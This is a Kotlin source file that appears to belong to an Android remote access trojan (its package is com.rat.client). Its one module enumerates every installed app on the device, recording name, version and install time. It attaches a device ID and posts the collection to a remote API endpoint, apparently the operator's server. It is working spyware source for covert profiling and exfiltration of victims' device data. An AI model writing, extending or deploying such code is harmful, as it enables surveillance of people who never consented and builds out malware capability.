package com.rat.client.utils

import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import com.rat.client.Config
import org.json.JSONArray
import org.json.JSONObject

/**
 * Lists all installed applications on the device.
 */
object AppListUtils {
    private const val TAG = "AppListUtils"

    fun getInstalledApps(context: Context) {
        try {
            val pm = context.packageManager
            val appsList = JSONArray()

            @Suppress("DEPRECATION")
            val intent = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            for (app in intent) {
                try {
                    val appInfo = pm.getApplicationInfo(app.packageName, 0)
                    val appJson = JSONObject()
                    appJson.put("packageName", app.packageName)
                    appJson.put("appName", pm.getApplicationLabel(appInfo) ?: app.packageName)

                    try {
                        val pkgInfo = pm.getPackageInfo(app.packageName, 0)
                        appJson.put("versionName", pkgInfo.versionName ?: "")
                        appJson.put("firstInstallTime", pkgInfo.firstInstallTime)
                    } catch (e: Exception) {
                        appJson.put("versionName", "")
                        appJson.put("firstInstallTime", 0)
                    }

                    appsList.put(appJson)
                } catch (e: Exception) {
                    // Skip apps we can't read
                }
            }

            if (appsList.length() > 0) {
                val payload = JSONObject()
                payload.put("deviceId", DeviceInfoUtils.getDeviceId(context))
                payload.put("apps", appsList)

                ApiClient.post(Config.Api.APPS, payload)
                Log.d(TAG, "Sent ${appsList.length()} installed apps")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Apps list error: ${e.message}")
        }
    }
}

